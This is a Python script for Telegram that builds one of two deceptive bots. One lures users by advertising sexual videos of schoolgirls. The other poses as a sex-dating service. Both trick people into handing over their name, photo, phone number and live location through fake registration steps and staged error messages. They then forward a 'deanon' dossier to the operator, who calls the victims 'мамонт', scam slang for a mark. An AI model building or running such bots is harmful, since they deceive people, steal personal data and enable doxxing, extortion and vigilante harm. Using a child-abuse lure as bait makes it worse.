import telebot
import markups as m
import markups2 as m2
import colorama
from colorama import Fore,Back,Style
import time
import os
import random 


os.system('clear')

print(Fore.BLUE,"""
.--|  |.-----.-----.|  |--.-----.|  |_.-----.
|  _  ||     |     ||  _  |  _  ||   _|__ --|
|_____||__|__|__|__||_____|_____||____|_____|""")
print('Автор скрипта @telebotuser.Наш канал https://t.me/koshmagram')

time.sleep(1)

print('\nВведи токен бота...')
token = input()

print('\nВведи свой Телеграм айди...')
admin_id = input()

print('\nВыберите бота:\n1)Ловля педофилов\n2)Секс знакомства')
choose = input()

if choose == '1':
	bot = telebot.TeleBot(token)
	print('\nБот запущен!')
	@bot.message_handler(commands=['start','help'])
	def start_message(message):
		bot.send_message(admin_id,f'🔔Обнаружен новый пользователь!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}')
		print(f'\nОбнаружен новый пользователь!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}')
		bot.send_message(message.chat.id,f'👋Приветствую {message.from_user.full_name}!🔞Ищешь видео со школьницами?Тогда тебе к нам!',reply_markup=m.next)
	@bot.message_handler(commands=['koshmavarius'])
	def koshmarik(message):
		bot.send_message(message.chat.id,'@telebotuser is a creator this script.Good Luck!')
	
	@bot.message_handler()
	def reg(message):
		if message.text == '🔥Продолжить':
			msg = bot.send_message(message.chat.id,'❗Для использования бота необходима регестрация',reply_markup=m.regphone)
			bot.register_next_step_handler(msg,phone)
	
	def phone(message):
		if message.contact:
			phone_user = message.contact.phone_number
			bot.send_message(admin_id,f'🔔Педофил отправил номер/nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}')
			print(f'\nПедофил отправил номер/nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}')
			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз',reply_markup=m.regloc)
			bot.register_next_step_handler(msg,loc,phone_user)
		else:
			msg = bot.send_message(message.chat.id,'❗Для использования бота необходима регестрация')
			bot.register_next_step_handler(msg,phone)
			
	def loc(message,phone_user):
		if message.location:
			dolgota = message.location.longitude
			shirota = message.location.latitude
			bot.send_message(admin_id,f'🔔Деанон на педофила составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
			print(f'\nДеанон на педофила составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Повторите попытку позже.')
			bot.register_next_step_handler(msg,fakeerror,phone_user,shirota,dolgota)
	
	def fakeerror(message,phone_user,shirota,dolgota):
		if message.text:
			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Повторите попытку позже.')
			bot.register_next_step_handler(msg,fakeerror,phone_user,shirota,dolgota)
		if message.location:
			bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Повторите попытку позже.')
			msg = bot.send_message(admin_id,f'🔔Педофил отправил адрес еще раз!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
			print(f'\nПедофил отправил адрес еще раз!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phone_user}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}')
			bot.register_next_step_handler(msg,fakeerror,phone_user,shirota,dolgota)
	bot.polling(none_stop=True)

if choose == '2':
	bot = telebot.TeleBot(token)
	print('Бот запущен!')

	@bot.message_handler(commands=['start'])
	def start(message):
		print(f'\nОбнаружен новый пользователь!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}')
		bot.send_message(admin_id,f'🔔Обнаружен новый пользователь!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}')
		bot.send_message(message.chat.id,f'👋Здарова {message.from_user.full_name}!\n🔥Хочешь найти подружку на вечер или отношения без обязательств?Тогда тебе к нам!Жми на кнопку снизу',reply_markup=m2.next)

	@bot.message_handler()
	def anketa(message):
		if message.text == '🔞Продолжить':
			msg = bot.send_message(message.chat.id,'Как вас зовут?')
			bot.register_next_step_handler(msg,name)

	def name(message):
		nameuser = message.text
		msg = bot.send_message(message.chat.id,'Сколько вам лет?')
		bot.register_next_step_handler(msg,age,nameuser)
		
	def age(message,nameuser):
		ageuser = message.text
		try:
			if int(message.text):
				if int(message.text)>=18:
					msg = bot.send_message(message.chat.id,f'Ваше имя "{nameuser}",возраст "{ageuser}".Все верно?Идем дальше?',reply_markup=m2.yesno)
					bot.register_next_step_handler(msg,check,nameuser,ageuser)
				else:
					msg = bot.send_message(message.chat.id,'❗Несовершеннолетние лица не могут использовать данного бота')
					bot.send_message(message.chat.id,'Сколько вам лет?')
					bot.register_next_step_handler(msg,age,nameuser)
		except:
			if message:
				msg = bot.send_message(message.chat.id,'❗Введите возраст цифрами')
				bot.register_next_step_handler(msg,age,nameuser)
				
	def check(message,nameuser,ageuser):
		if message.text == 'Да':
			msg = bot.send_message(message.chat.id,'Хорошо,отправте свою фотографию')
			bot.register_next_step_handler(msg,photo,nameuser,ageuser)
		elif message.text == 'Нет':
			msg = bot.send_message(message.chat.id,'Как вас зовут?')
			bot.register_next_step_handler(msg,name)
			
	def photo(message,nameuser,ageuser):
		if message.photo:
			photouser = message.photo[-1].file_id
			minus = int(ageuser)-int(random.randint(1,4))
			plus = int(ageuser)+int(random.randint(1,4))
			kolvo = random.randint(12,24)
			bot.send_message(message.chat.id,'Пожалуйста подождите...')
			time.sleep(4)
			msg = bot.send_message(message.chat.id,f'🌟Хорошие новости,{nameuser}!{kolvo} девушкам от {minus} до {plus} лет понравилась ваша анкета!Анкета заполнена,вам осталось только зарегестрироваться по кнопке снизу',reply_markup = m2.regphone)
			bot.register_next_step_handler(msg,phone,nameuser,ageuser,photouser)
		else:
			msg = bot.send_message(message.chat.id,'❗Отправте свою фотографию')
			bot.register_next_step_handler(msg,photo,nameuser,ageuser)

	def phone(message,nameuser,ageuser,photouser):
		if message.contact:
			phoneuser = message.contact.phone_number
			bot.send_photo(admin_id,photouser,caption =f'🔔Мамонт заполнил анкету!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phoneuser}\nЕго анкета:\nИмя {nameuser}\nВозраст {ageuser}')
			print(f'\nМамонт заполнил анкету!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phoneuser}\nЕго анкета:\nИмя {nameuser}\nВозраст {ageuser}')
			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз',reply_markup=m2.regloc)
			bot.register_next_step_handler(msg,loc,nameuser,ageuser,photouser,phoneuser)
		else:
			msg = bot.send_message(message.chat.id,'❗Необходимо зарегестрироваться')
			bot.register_next_step_handler(msg,phone,nameuser,ageuser,photouser)
			
	def loc(message,nameuser,ageuser,photouser,phoneuser):
		if message.location:
			shirota = message.location.latitude
			dolgota = message.location.longitude
			bot.send_photo(admin_id,photouser,caption=f'🔔Деанон на мамонта составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phoneuser}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}\nЕго анкета:\nИмя {nameuser}\nВозраст {ageuser}')
			print(f'\nДеанон на мамонта составлен!\nНик {message.from_user.full_name}\nЮзер @{message.from_user.username}\nАйди {message.from_user.id}\nНомер +{phoneuser}\nАдрес https://www.google.com/maps/place/{shirota}+{dolgota}\nЕго анкета:\nИмя {nameuser}\nВозраст {ageuser}')
			msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз')
			bot.register_next_step_handler(msg,noexit)
			
	def noexit(message):
		msg = bot.send_message(message.chat.id,'❗Произошла неопознанная ошибка.Попробуйте еще раз')
		bot.register_next_step_handler(msg,noexit)
	bot.polling(none_stop=True)


		

				
				